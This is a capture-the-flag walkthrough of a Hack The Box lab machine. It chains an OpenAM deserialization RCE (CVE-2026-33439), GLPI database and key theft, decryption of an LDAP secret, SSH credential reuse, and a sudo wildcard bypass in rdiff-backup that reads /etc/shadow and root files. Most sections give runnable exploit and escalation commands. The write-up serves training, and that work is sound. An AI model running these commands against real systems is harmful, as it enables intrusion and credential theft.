---
tags: [HTB, Management, Linux, OpenAM, CVE-2026-33439, RCE, GLPI, SSH, CredentialReuse, Sudo, RdiffBackup, Easy]
platform: HackTheBox
os: Ubuntu 24.04.5 LTS
hostname: management
difficulty: Easy
ip: $BoxIP
status: Complete
domain: management.htb
---

# HTB: Management, Full Walkthrough

## The gist

Management is an easy Linux box whose difficulty comes from following a chain across several applications rather than from a single exposed service. OpenAM 16.0.5 is vulnerable to unauthenticated `jato.clientSession` deserialization, giving command execution as `openam`. That access exposes the GLPI database configuration and application key, which leads to an LDAP secret and then SSH access as Owen through credential reuse.

Owen's sudo rule appears to restrict `rdiff-backup` to read-only access under `/opt/backup`, but its trailing wildcard accepts a second `--restrict-path /`. The resulting rdiff-backup server can read root-only files, including the root proof. The important habits are validating each transition, recording dead ends, and treating backup utilities and argument handling as privilege boundaries.

Attack chain:

~~~text
Full TCP scan
  -> Nginx and OpenAM identification
  -> manual OpenAM CVE-2026-33439 RCE
  -> command execution as openam
  -> readable GLPI DB configuration
  -> GLPIKey decrypts the LDAP bind secret
  -> secret reused for SSH as owen
  -> NOPASSWD rdiff-backup with a wildcard
  -> duplicate --restrict-path / bypass
  -> read-only rdiff retrieval of root evidence
~~~

> [!warning] Evidence boundary
> The private workspace contains the complete command/output record, including failed RMI tests, rejected authentication attempts, shell quoting mistakes, and rdiff protocol failures. This write-up keeps passwords, hashes, flags, serialized payloads, and private keys out of the vault. The transcript and private loot remain authoritative.

## Box information

| Field | Value |
|---|---|
| Platform | Hack The Box |
| Operating system | Ubuntu 24.04.5 LTS, kernel 6.8.0-139-generic |
| Hostname | management |
| Target | `$BoxIP` |
| Domain | management.htb |
| Difficulty | Easy |
| Initial access | OpenAM pre-authentication deserialization RCE |
| Foothold identity | `openam` |
| User identity | `owen` |
| Privilege path | Wildcard argument injection in an rdiff-backup sudo rule |
| Final proof | Root-only evidence retrieved through the permitted read-only backup interface |

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | OpenAM 16.0.5 accepts a malicious `jato.clientSession` value before authentication | Python PoC returned command output as `openam` |
| 2 | GLPI database configuration is readable after the foothold | `/opt/glpi/config/config_db.php` |
| 3 | GLPI stores the LDAP bind secret encrypted with a readable application key | `glpi_authldaps` plus `glpicrypt.key` |
| 4 | The recovered secret is reused for the local Owen account | Targeted SSH validation |
| 5 | Owen can run a root rdiff-backup server with a trailing wildcard | `sudo -n -l` |
| 6 | Duplicate `--restrict-path /` overrides the intended path restriction | rdiff protocol test and root mirror |

## Evidence and loot

The authoritative private workspace is:

`/tmp/codex_Management-10-129-1-101-20260914/`

The complete command-by-command record is split into:

- `command-index.log`: numbered command index
- `commands/`: one command file per runner step
- `outputs/`: separate stdout, stderr, and metadata files
- `transcript.log`: full terminal transcript
- `notes/handoff.md`: attack-chain handoff and gotchas
- `notes/artifact-sha256.log`: artifact integrity manifest

Important private evidence includes:

| Evidence | Private location |
|---|---|
| Full TCP and service scans | `$BoxDir/nmap/` |
| OpenAM PoC source and payload tooling | `$BoxDir/exploits/cve-2026-33439-poc/` and `$BoxDir/exploits/cve-2026-33439-python-poc/` |
| OpenAM RCE responses | `$BoxDir/loot/rce-*.body` and matching headers |
| GLPI configuration and database results | `$BoxDir/loot/rce-glpi-*.body` and `$BoxDir/loot/rce-db-*.body` |
| Owen credential | `$BoxDir/loot/credentials.txt` |
| User and root proof | `$BoxDir/loot/user.txt` and `$BoxDir/loot/root.txt` |
| Root-only evidence | `$BoxDir/loot/etc-shadow`, `$BoxDir/loot/mgmt-backup`, and `$BoxDir/loot/borg-passphrase` |
| rdiff mirrors | `$BoxDir/downloads/rdiff-safe/`, `$BoxDir/downloads/rdiff-root/`, and `$BoxDir/downloads/rdiff-root-evidence/` |
| Screenshots | `$BoxDir/screenshots/` only, never copied into this vault |

The runner recorded 397 numbered commands and separate stdout, stderr, and metadata logs. No Metasploit exploitation framework was used.

## Variables

Use the standard workspace variables. Keep recovered values in the private `.env` or loot files rather than placing them in this page.

~~~bash
boxstart $BoxName $BoxIP htb
htblog
boxset BoxName Management
boxset BoxIP $BoxIP
boxset Domain management.htb
boxset WebPort 443
boxset Port 4445
~~~

For the manual replay, load the private values only after they have been recorded by the loot helper:

~~~bash
source "$BoxDir/.env"
~~~

> [!warning] Variable discipline
> Do not paste passwords, hashes, flags, or serialized `jato.clientSession` values into the write-up. The commands below use `$Password`, `$Password2`, `$Password3`, and `$Password4` as private run variables where needed.

## 1. Initialise the session and preserve evidence

The first step is not exploitation. It is establishing a workspace, active target, callback settings, and complete output capture. The helper creates the standard folders, while `htblog` preserves terminal output so a failed probe can be reviewed instead of being reconstructed from memory.

~~~bash
boxstart $BoxName $BoxIP htb
htblog
boxset BoxName Management
boxset BoxIP $BoxIP
boxset Domain management.htb
boxset WebPort 443
boxset Port 4445
~~~

The autonomous evidence workspace used the isolated equivalent under `/tmp/`, so the manual source and the autonomous transcript remain separate.

SCREENSHOT: `box-started` -- private screenshot showing the box marker and clean workspace.

## 2. Discover every TCP port

The first Nmap attempt used a raw-packet style scan and hit a local permission problem. That error was not target evidence. The successful run used a TCP connect scan with `-sT`, which works without raw packet privileges and still gives a complete TCP port list.

~~~bash
nmap -Pn -n -sT -p- --min-rate 5000 -T4 \
  -oA "$BoxDir/nmap/allports" "$BoxIP"
~~~

The authoritative scan found:

~~~text
22/tcp     SSH
80/tcp     HTTP
443/tcp    HTTPS
1689/tcp   Java RMI
4444/tcp   TLS-wrapped or Java-related service
46149/tcp  Java RMI endpoint
50389/tcp  Directory service
~~~

The unusual Java and directory-service ports were retained as leads rather than ignored because the web application alone did not explain the full surface.

SCREENSHOT: `nmap-allports` -- red: all open ports; green: the unusual RMI and directory ports.

> [!warning] Nmap privilege gotcha
> An Nmap raw-socket error means the local scan method lacked permission. It does not mean the target ports are filtered. Switch to `-sT` or rerun the intended scan with the required local privilege, then record which output is authoritative.

## 3. Identify services, hostnames, and TLS names

Run service detection only against the ports already found. `-sV` identifies service versions, `--version-light` keeps the probe practical on unusual Java services, and `--script=banner` collects simple service clues without turning the scan into an exploit attempt.

~~~bash
nmap -Pn -n -sT -sV --version-light --script=banner \
  -p 22,80,443,1689,4444,46149,50389 \
  -oA "$BoxDir/nmap/services" "$BoxIP"
~~~

The scan identified OpenSSH 9.6p1 and Nginx 1.24.0. The 1689 and 46149 services were Java RMI. Port 50389 returned OpenDJ-style LDAP behaviour. TLS inspection showed `management.htb` and `sso.management.htb`, so add the names before using host-sensitive web and Java tooling.

~~~bash
printf '%s\n' "$BoxIP management.htb sso.management.htb" | \
  sudo tee -a /etc/hosts
openssl s_client -connect management.htb:443 -servername management.htb \
  -brief </dev/null
~~~

The web root was a static Nginx site, while `sso.management.htb` redirected into OpenAM. The domain name was essential because the OpenAM endpoint and TLS certificate did not behave like a bare IP target.

SCREENSHOT: `nmap-services` -- red: service/version lines; green: host and TLS naming clues.

## 4. Inspect the web surface before exploiting it

Start with normal HTTP responses and the TLS virtual host. The `--resolve` option keeps the request pointed at the target IP while preserving the hostname in the TLS SNI and HTTP Host fields.

~~~bash
curl -k -sS --resolve "management.htb:443:$BoxIP" \
  -D "$BoxDir/www/management.headers" \
  -o "$BoxDir/www/management.body" \
  https://management.htb/

curl -k -sS --resolve "sso.management.htb:443:$BoxIP" -L \
  -D "$BoxDir/www/openam.headers" \
  -o "$BoxDir/www/openam.body" \
  https://sso.management.htb/openam/
~~~

The root site exposed the management portal and a separate encrypted JavaScript asset. The SSO virtual host exposed OpenAM. I also checked the expected OpenAM JSON routes and the public management pages. Protected administrative endpoints consistently returned `401` or `403`, which ruled out an unauthenticated admin API route.

~~~bash
for path in \
  /openam/json/serverinfo/\* \
  /openam/json/realms/root/users?_queryFilter=true \
  /openam/json/realms/root/scripts?_queryFilter=true \
  /openam/json/realms/root/serverinfo/version; do
  printf '%s\n' "===== $path ====="
  curl -k -sS --resolve "sso.management.htb:443:$BoxIP" \
    -i "https://sso.management.htb$path" | sed -n '1,25p'
done
~~~

> [!abstract] Branch decision
> A public Nginx root page and a protected OpenAM SSO application suggest web enumeration first. The OpenDJ/RMI ports remain possible alternate routes, but the SSO version and deserialization surface are more direct than guessing at credentials or administrative sessions.

## 5. RMI and anonymous-session rabbit holes

The scan showed a Java RMI registry and OpenDJ JMX stub. I enumerated the registry and adapted the local Nmap RMI scripts to the non-standard ports. One script reported the default remote class-loading condition, but a real rebind/class-loading attempt failed because the target disabled the RMI class loader and rejected non-local registry operations.

~~~bash
nmap -Pn -n -sT --script=rmi-dumpregistry,rmi-vuln-classloader \
  -p 1689,46149 -oA "$BoxDir/nmap/rmi" "$BoxIP"

nmap -Pn -n -sT --script="$BoxDir/exploits/rmi-vuln-classloader-custom.nse" \
  -p 1689,46149 -oA "$BoxDir/nmap/rmi-classloader" "$BoxIP"
~~~

The failed route was kept in the transcript because it taught an important distinction: a scanner's vulnerable-looking banner or default registry condition is not the same as a working exploit path. The target-side runtime controls still mattered.

I also tested anonymous LDAP tree/config access and OpenAM anonymous sessions. The application accepted an anonymous authentication flow, but the resulting token did not authorize user, session, or administrative API reads. Default OpenAM credential guesses and monitor-token reuse also returned `401`.

~~~bash
ldapsearch -x -LLL -H "ldap://$BoxIP:50389" \
  -b "dc=management,dc=htb" -s sub '(objectClass=*)' dn uid cn

curl -k -sS --resolve "sso.management.htb:443:$BoxIP" \
  -X POST -H 'X-OpenAM-Username: invalid' \
  -H 'X-OpenAM-Password: invalid' \
  https://sso.management.htb/openam/json/realms/root/authenticate
~~~

> [!warning] Rabbit-hole lesson
> Anonymous authentication is not automatically anonymous administration. Record the token, test the exact endpoint that matters, and stop when the authorization boundary is demonstrated instead of assuming a `200` from the login flow means useful access.

## 6. Identify OpenAM and select the manual RCE path

OpenAM exposed enough version and application behaviour to search for a matching public vulnerability. Older OpenAM routes such as CVE-2021-35464 were reviewed and tested, but the target's endpoint and method behaviour did not produce command execution. The relevant match was OpenAM 16.0.5 and CVE-2026-33439, a pre-authentication `jato.clientSession` deserialization issue.

The manual PoC used in the walkthrough was TheMalwareGuardian implementation, with the local copy retained under `$BoxDir/exploits/cve-2026-33439/`. A Python implementation was also retained in the autonomous workspace because it embeds the serialized payload and takes the command from the HTTP `cmd` header.

~~~bash
git clone https://github.com/TheMalwareGuardian/CVE-2026-33439.git \
  "$BoxDir/exploits/cve-2026-33439"
cd "$BoxDir/exploits/cve-2026-33439"
python3 exploit.py --help
~~~

Use the vulnerable password-reset validation endpoint and start with a harmless identity command:

~~~bash
python3 exploit.py \
  --url https://sso.management.htb/openam/ui/PWResetUserValidation \
  'id'
~~~

The HTTP response returned command output as the `openam` service account. The result was a real execution proof, not merely an error-page difference.

SCREENSHOT: `rce-callback` -- red: HTTP success and command output; green: the execution identity.

> [!warning] PoC gotcha
> The initial Java echo payload and several endpoint variations did not produce useful output. Keep the endpoint, payload format, and command delivery mechanism together. The working Python PoC uses `jato.clientSession` in the query string and the command in the `cmd` header.

## 7. Enumerate the OpenAM foothold

Once command execution is proven, establish the service identity, host, operating system, and accessible application directories. This determines whether the next step is a local Linux privilege escalation, an application pivot, or credential recovery.

~~~bash
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation \
  'id; hostname; pwd; uname -a; cat /etc/os-release'

python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation \
  'cat /etc/passwd; echo HOME; ls -la /home; echo OPT; find /opt -maxdepth 2 -ls 2>/dev/null'
~~~

The command context was `openam`, the hostname was `management`, and the host was Ubuntu 24.04.5 LTS on x86_64. The human account was `owen`, but `/home/owen` was not readable from the OpenAM service context. `/opt/openam`, `/opt/openam-tomcat`, and `/opt/glpi` were the useful application trees.

I checked the obvious local routes before pivoting:

~~~bash
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation \
  'sudo -n -l 2>&1; find / -xdev -type f -perm -4000 -ls 2>/dev/null; getcap -r / 2>/dev/null; find / -xdev -type f -writable -user root -ls 2>/dev/null'
~~~

The standard SUID set was not useful, writable root-owned files were not found, and the available `snap-confine` capability did not lead to an installed snap or an allowed security tag. A root-owned `sysmon` service was inspected, but its binary, configuration, process descriptors, and restart path were protected. The systemd timer and backup service were informative, but the OpenAM account could not control them.

> [!tip] ⚡ More efficient path
> `sudo -n -l`, SUID, capabilities, writable-root checks, process review, cron, and systemd checks were all reasonable first triage. Once those checks showed the service account was boxed away from the local root paths, readable application configuration became the faster route. Do not keep repeating generic kernel or SUID checks after the evidence has ruled them out.

SCREENSHOT: `foothold` -- red: `openam` identity and hostname; green: the readable application paths.

## 8. Recover the GLPI database credential

The GLPI installation was readable by the OpenAM execution context. Its database configuration contained a database username, database name, and password. Store the password privately and use the database only to enumerate relevant authentication and secret-bearing tables.

~~~bash
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation \
  'sed -n "1,180p" /opt/glpi/config/config_db.php; ls -l /opt/glpi/config/glpicrypt.key'

python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation \
  'dbpw=$(grep -oE "[A-Za-z0-9]{12,}" /opt/glpi/config/config_db.php | head -1); mysql --protocol=TCP -h 127.0.0.1 -uglpi -p"$dbpw" glpidb -e "SHOW TABLES"'
~~~

The database account had access to `glpidb` but no global MariaDB privileges. That ruled out the tempting `sys_exec`, `sys_eval`, and `LOAD_FILE` route as a direct root shell. The useful table was `glpi_authldaps`, which contained the LDAP bind DN and an encrypted bind password.

~~~bash
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation \
  'dbpw=$(grep -oE "[A-Za-z0-9]{12,}" /opt/glpi/config/config_db.php | head -1); mysql --protocol=TCP -h 127.0.0.1 -uglpi -p"$dbpw" glpidb -NBe "SELECT name,rootdn,rootdn_passwd FROM glpi_authldaps"'
~~~

SCREENSHOT: `glpi-db-creds` -- red: the GLPI configuration path and database connection evidence; yellow: keep the actual password hidden.

> [!warning] Database pivot gotcha
> Database access is not automatically database-level code execution. The grants output proved that this account was confined to the GLPI database. The pivot succeeded because configuration data and an application-encrypted secret were more valuable than the database privileges themselves.

## 9. Understand and reverse GLPIKey encryption

GLPI stores selected database secrets as Base64 text. The decoded value begins with a 24-byte XChaCha20-Poly1305 nonce, followed by the ciphertext and authentication tag. GLPI uses the nonce both as the nonce and as the additional authenticated data, and the key is stored in `/opt/glpi/config/glpicrypt.key`.

The target-side PHP one-liner mirrors `GLPIKey::decrypt()` without printing the key or ciphertext into the write-up:

~~~bash
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation \
  'dbpw=$(grep -oE "[A-Za-z0-9]{12,}" /opt/glpi/config/config_db.php | head -1); enc=$(mysql --protocol=TCP -h 127.0.0.1 -uglpi -p"$dbpw" glpidb -NBe "SELECT rootdn_passwd FROM glpi_authldaps LIMIT 1"); php -r '\''$raw=base64_decode($argv[1]); $key=file_get_contents("/opt/glpi/config/glpicrypt.key"); $nonce=substr($raw,0,24); $cipher=substr($raw,24); echo sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($cipher,$nonce,$nonce,$key),PHP_EOL;'\'' "$enc"'
~~~

The decrypted value was saved privately and was not useful as an LDAP bind on the exposed OpenDJ listener. That was a valuable negative result, not a failure of the decryption. The same secret was then tested for controlled credential reuse against SSH as Owen.

SCREENSHOT: `ldap-encrypted-creds` -- red: the encrypted `rootdn_passwd` field; green: the readable GLPI key path.

SCREENSHOT: `ldap-decrypted` -- red: successful private decryption result; do not include the secret itself in the vault.

> [!abstract] Why this mattered
> The application already contained the decryption routine and key. Recovering the plaintext did not require breaking modern cryptography. It required understanding the data format, locating the key, and reproducing the application's nonce and additional-data handling exactly.

## 10. Validate credential reuse and obtain SSH as Owen

The LDAP service rejected the decrypted secret, so I did not force that route. Credential reuse is common in lab environments and real assessments, but it must be tested carefully and with a controlled candidate list. The successful validation was SSH as Owen.

~~~bash
boxset Username2 owen
boxset Password2 $Password2
hydra -l "$Username2" -p "$Password2" -t 1 -f ssh://$BoxIP
ssh "$Username2@$BoxIP"
~~~

Confirm the new identity before doing privilege escalation:

~~~bash
id
hostname
pwd
uname -a
~~~

The session was Owen on `management`, with a normal home directory and a root-owned user proof readable through the Owen group. The first flag was confirmed privately from `/home/owen/user.txt` and saved under `$BoxDir/loot/user.txt`.

SCREENSHOT: `user-flag` -- red: the private path and successful read; do not capture or reproduce the flag value.

> [!warning] Credential-reuse lesson
> A decrypted secret can be valid for a different service even when the intended LDAP bind fails. Conversely, a failed LDAP bind does not invalidate the recovered value. Test the small, evidence-based set of likely accounts and services, then stop rather than spraying a broad password list.

## 11. Read Owen's exact sudo boundary

Run `sudo -n -l` first. The `-n` flag prevents a password prompt and makes it clear whether a rule is genuinely passwordless. Preserve the complete rule because the executable path, fixed arguments, and wildcard placement all determine the attack surface.

~~~bash
sudo -n -l
~~~

The important rule was:

~~~text
(root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
~~~

`rdiff-backup --server` starts the remote backup protocol. `--restrict-path /opt/backup` is intended to confine file access, and `--restrict-mode read-only` is intended to prevent changes. The final `*` is the weakness: sudo accepts additional arguments after the fixed prefix, including another `--restrict-path /`.

Validate the parser without reading or changing files:

~~~bash
sudo -n /usr/bin/rdiff-backup --server \
  --restrict-path /opt/backup --restrict-mode read-only \
  --restrict-path / --version
~~~

The duplicate restriction was accepted and the target reported rdiff-backup 2.2.6. The restriction bypass was then tested through the actual read-only protocol rather than assumed from the parser result.

SCREENSHOT: `sudo-l` -- red: the full NOPASSWD rdiff-backup rule; green: the wildcard after the fixed restriction.

## 12. Use rdiff-backup's remote protocol safely

The manual client must speak the same rdiff-backup protocol as the target server. `--remote-schema` controls the command launched for the remote side. The rdiff-backup v2 validator requires a `{h}` placeholder in the schema, but the target is already the local SSH session, so the placeholder is placed after a shell comment marker with `#{h}`. This satisfies the validator without adding a second network connection.

The completed manual command was:

~~~bash
rdiff-backup \
  --remote-schema "sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path / #{h}" \
  backup localhost::/root "$BoxDir/loot/rdiff-root"
~~~

The source path requests `/root`, while the privileged server command contains the duplicate root restriction. The resulting read-only mirror placed `root.txt` under the local rdiff destination. The value was saved privately as `$BoxDir/loot/root.txt` and was not included in the vault.

SCREENSHOT: `root-flag` -- red: successful root proof path and privileged evidence; do not capture the flag value.

> [!warning] rdiff protocol gotchas
> The first local bridge used buffered `read(65536)` on stdin and hung because the protocol sends smaller messages. Replacing it with `os.read()` and `select()` allowed bytes to forward immediately. The first client invocation also placed `--no-compression` before the `backup` action, which this version rejected. The successful run put action-specific options after `backup`.

> [!tip] Evidence-first validation
> Before requesting `/root`, the protocol was tested against the intended `/opt/backup` path and returned `Server OK`. Only after the safe path succeeded was the duplicate restriction used to request root evidence. This separates a transport problem from an authorization bypass.

## 13. Confirm root evidence and inspect the backup design

The root mirror contained more than the root proof. I collected targeted evidence rather than copying the entire filesystem: `/etc/shadow`, the root-owned `/usr/local/bin/mgmt-backup`, and `/etc/borg/passphrase` through its parent directory.

~~~bash
rdiff-backup \
  --remote-schema "sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path / #{h}" \
  backup --include /etc/shadow \
  --include /usr/local/bin/mgmt-backup \
  --exclude '**' localhost::/ "$BoxDir/loot/root-evidence"
~~~

The root backup script showed that a nightly systemd timer creates a Borg archive of `/etc` and `/opt/glpi/config`, using a passphrase stored in `/etc/borg/passphrase`. That timer was a useful discovery but not the primary escalation route. The sudo rdiff rule was faster and already sufficient for root evidence.

The isolated evidence workspace also contains supplemental identity proof from a recovered root key under its rdiff root mirror. That proof is not required for the escalation chain: the authoritative root evidence is the read-only retrieval of `root.txt` through the permitted rdiff command. No target files were modified by the rdiff reads.

## 14. Cleanup and evidence handling

This route did not require a persistent target payload, account creation, service change, or file modification. Preserve the private source workspace because it contains the failed attempts and evidence needed for exam review.

~~~bash
boxdone
find "$BoxDir" -maxdepth 2 -type f | sort
~~~

The private workspace contains the flags, credentials, root-only files, source PoCs, mirrors, screenshots, command files, stderr logs, and the final artifact hash manifest. Do not copy the screenshots or private values into the Obsidian vault.

## RUNBOOK V2 Stages Used

- [[OSCP/RUNBOOK V2/Start Here|Start Here]] -- workspace, variables, and evidence discipline
- [[OSCP/RUNBOOK V2/Port Triage|Port Triage]] -- full TCP discovery and branch selection
- [[OSCP/RUNBOOK V2/Linux - Service Scan|Linux - Service Scan]] -- Nginx, OpenSSH, RMI, and directory-service identification
- [[OSCP/RUNBOOK V2/Linux - Web Enum|Linux - Web Enum]] -- management and SSO virtual-host inspection
- [[OSCP/RUNBOOK V2/Web - Virtual Host Enumeration|Web - Virtual Host Enumeration]] -- hostname and TLS virtual-host handling
- [[OSCP/RUNBOOK V2/Linux - Exploit Search|Linux - Exploit Search]] -- version matching and manual PoC selection
- [[OSCP/RUNBOOK V2/Linux - RCE to Shell|Linux - RCE to Shell]] -- command execution identity proof
- [[OSCP/RUNBOOK V2/Linux - Local Enum|Linux - Local Enum]] -- identity, processes, writable paths, capabilities, cron, and systemd checks
- [[OSCP/RUNBOOK V2/Linux - Credential Search|Linux - Credential Search]] -- OpenAM and GLPI configuration review
- [[OSCP/RUNBOOK V2/Linux - Database Access|Linux - Database Access]] -- MariaDB inspection and GLPI table triage
- [[OSCP/RUNBOOK V2/Linux - SSH Brute Force|Linux - SSH Brute Force]] -- controlled credential-reuse validation over SSH
- [[OSCP/RUNBOOK V2/Linux - Sudo Check|Linux - Sudo Check]] -- exact Owen sudo rule and argument review
- [[OSCP/RUNBOOK V2/Linux - OpenAM JATO Deserialization|Linux - OpenAM JATO Deserialization]] -- OpenAM 16.0.5 pre-authentication command-execution proof
- [[OSCP/RUNBOOK V2/Linux - Rdiff-Backup Sudo Abuse|Linux - Rdiff-Backup Sudo Abuse]] -- duplicate restriction injection and read-only protocol proof
- [[OSCP/RUNBOOK V2/Linux - Clean Down|Linux - Clean Down]] -- evidence retention and no target-side persistence

> [!success] Runbook coverage
> The OpenAM JATO and rdiff-backup-specific branches are now covered by dedicated RUNBOOK V2 pages. No runbook gap remains for the verified Management attack chain.

## Attack Chain

| Stage | Finding | Consequence |
|---|---|---|
| Recon | Nginx, OpenAM, Java RMI, OpenDJ, and SSH exposed | SSO and application enumeration became the primary branch |
| Exploit selection | OpenAM 16.0.5 matched CVE-2026-33439 | Manual pre-auth deserialization RCE |
| Foothold | Response returned `id` as `openam` | Command execution in the application service context |
| Application pivot | GLPI DB config and key were readable | Database access and secret recovery |
| Crypto pivot | GLPIKey decryption recovered the LDAP secret | Controlled credential-reuse tests became possible |
| User access | Secret authenticated as Owen over SSH | Stable local shell and user proof |
| Privilege triage | Owen had NOPASSWD rdiff-backup with `*` | Argument injection became the direct privesc route |
| Root evidence | Duplicate `--restrict-path /` was accepted | Read-only access to root-only files and root proof |

## Credentials

| Account | Source | Use |
|---|---|---|
| `glpi` | `/opt/glpi/config/config_db.php` | Read the GLPI database |
| `svc-glpi` | `glpi_authldaps` after GLPIKey decryption | Secret source and credential-reuse candidate |
| `owen` | Reused GLPI LDAP secret | SSH foothold and sudo enumeration |
| `root` | rdiff root mirror and recovered SSH key | Final proof |

Passwords, hashes, private keys, serialized payloads, and session tokens remain in private loot only.

## Flags

| Flag | Status | Private evidence |
|---|---|---|
| `user.txt` | Confirmed | `$BoxDir/loot/user.txt` |
| `root.txt` | Confirmed | `$BoxDir/loot/root.txt` and `$BoxDir/downloads/rdiff-root/root.txt` |

The values are intentionally not reproduced in the vault.

## Key lessons and evidence-backed gotchas

- **A scanner finding is not an exploit.** The RMI scripts reported a class-loading condition, but the actual registry/class-loading attempts failed because the target disabled the runtime path. The evidence is preserved in the RMI Nmap artifacts and the failed exploit steps.
- **A successful anonymous login is not useful authorization.** OpenAM issued anonymous session material, but user, session, and admin API probes returned unauthorized responses. The lesson is to validate the exact permission needed, not just the authentication status.
- **The first correct pivot came from application-readable files.** SUID, capabilities, cron, systemd, Nginx, PHP-FPM, sysmon, and kernel checks produced no direct route. Continuing to read the application configuration found GLPI's DB connection and cryptographic key.
- **Database access and database root are different findings.** GLPI's MariaDB account was limited to its database. Testing `SHOW GRANTS`, `sys_exec`, `sys_eval`, and `LOAD_FILE` prevented the write-up from mistaking a database credential for operating-system code execution.
- **Cryptography often fails operationally before it fails mathematically.** The GLPI secret was recoverable because the key and the implementation were available. The important details were Base64 decoding, a 24-byte nonce, and using that nonce as both nonce and additional data.
- **A failed LDAP bind did not invalidate the secret.** The value was rejected by the exposed directory service, but credential reuse against SSH succeeded. Failed service validation should narrow the route, not erase the evidence.
- **Read the entire sudo rule.** The fixed `--restrict-path /opt/backup` looked safe until the trailing wildcard was tested with a duplicate `--restrict-path /`. Argument order and duplicate-option behaviour were the vulnerability.
- **Test protocol transport before testing the bypass.** The first rdiff bridge hung because buffered stdin delayed small protocol messages. The corrected `select()` bridge passed the safe server test before requesting `/root`.
- **Command-line options can be action-specific.** Placing `--no-compression` before `backup` caused a parser error. The corrected command placed it after the action.
- **Files and directories are different rdiff sources.** A direct file source failed because the client expects a directory. Backing up the parent directory retrieved the private passphrase without changing the target.
- **Documenting failure improves exam speed.** The transcript shows which paths were tested, why they were rejected, and which evidence justified moving on. That prevents cycling through RMI, anonymous API, SUID, sysmon, timer, and database routes again.

## Related Boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]] -- web command execution followed by a precise Linux sudo interpreter escape
- [[OSCP/BOXES/WRITE UPS/Linux/Bashed|Bashed]] -- web foothold followed by local Linux privilege enumeration and a scheduled-task route
- [[OSCP/BOXES/WRITE UPS/Linux/Blocky|Blocky]] -- application artifact credential recovery followed by SSH password reuse and sudo
- [[OSCP/BOXES/WRITE UPS/Linux/OpenAdmin|OpenAdmin]] -- application configuration secrets leading to credential reuse
- [[OSCP/BOXES/WRITE UPS/Linux/Knife|Knife]] -- web command execution and interpreter-based privilege escalation

## External Resources

- [Open Identity Platform OpenAM security advisory](https://github.com/OpenIdentityPlatform/OpenAM/security/advisories/GHSA-2cqq-rpvq-g5qj)
- [CVE-2026-33439 reference](https://nvd.nist.gov/vuln/detail/CVE-2026-33439)
- [TheMalwareGuardian CVE-2026-33439 PoC](https://github.com/TheMalwareGuardian/CVE-2026-33439)
- [GLPI source repository](https://github.com/glpi-project/glpi)
- [rdiff-backup documentation](https://rdiff-backup.net/rdiff-backup.1.html)
- [GTFOBins](https://gtfobins.github.io/)

## Tools Used

- `nmap` -- complete TCP discovery and service detection
- `curl` -- virtual-host, TLS, OpenAM endpoint, and RCE validation
- `ldapsearch` -- anonymous directory and configuration checks
- `smbclient` -- not required for the completed route, retained from general service triage
- `searchsploit` -- local public-exploit inventory
- Python -- manual OpenAM PoC, SSH command helper, and rdiff protocol bridge
- `mysql` -- GLPI database inspection
- PHP and Sodium -- GLPIKey decryption
- `hydra` -- controlled SSH credential-reuse validation
- `ssh` -- Owen foothold and final root-key proof
- `sudo` -- exact privilege-boundary validation
- `rdiff-backup` -- read-only root evidence retrieval

## Checklist

- [x] Workspace initialised and output capture enabled
- [x] Full TCP scan saved
- [x] Service and TLS names identified
- [x] RMI and anonymous OpenAM paths tested and documented
- [x] OpenAM 16.0.5 identified
- [x] Manual CVE-2026-33439 RCE confirmed
- [x] Foothold identity recorded as `openam`
- [x] GLPI DB configuration located
- [x] GLPI database grants checked
- [x] GLPIKey encryption format understood
- [x] LDAP secret decrypted privately
- [x] Secret reuse validated against SSH as Owen
- [x] Owen's exact sudo rule captured
- [x] Duplicate rdiff restriction validated
- [x] Safe rdiff protocol test completed
- [x] Root-only evidence retrieved read-only
- [x] User and root proofs saved privately
- [x] Screenshots excluded from the vault
- [x] No Metasploit exploitation framework used
- [x] Failure modes and gotchas documented

## Why this matters for OSCP

Management is a compact example of evidence-driven chaining. The foothold is a current application deserialization issue, but the useful exam skill is what follows: move from a service account to readable application configuration, distinguish database access from OS execution, understand an application's cryptography, test credential reuse selectively, and read a sudo rule as a parser and authorization boundary. The box rewards stopping dead ends quickly, preserving the failure evidence, and validating each privilege transition with a minimal command.
